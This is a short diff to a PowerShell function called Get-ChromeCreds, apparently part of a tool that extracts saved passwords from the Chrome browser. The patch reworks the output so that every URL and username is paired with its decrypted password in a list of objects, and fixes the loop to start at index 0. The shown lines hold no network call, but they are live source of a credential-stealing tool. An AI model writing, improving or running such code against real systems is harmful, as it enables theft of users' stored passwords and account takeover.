@@ -66,8 +66,15 @@ function Get-ChromeCreds() {
 	}
 
 	# Now create an object to store the previously created arrays
-	$Object = New-Object PSObject
-	for ($i = 1; $i -lt $UserNum; $i++) {
-		$Object | Select-Object @{n='URL/User';e={$UserArray[$i]}},@{n='Password';e={$DecPwdArray[$i]}}
-	}
+	$ArrayFinal = New-Object -TypeName System.Collections.ArrayList
+	for ($i = 0; $i -lt $UserNum; $i++) {
+		$ObjectProp = @{
+			Password = $DecPwdArray[$i]
+			UserURL = $UserArray[$i]
+		}
+	
+		$obj = New-Object PSObject -Property $ObjectProp
+		$ArrayFinal.Add($obj) | Out-Null
+		}
+	$ArrayFinal
 }
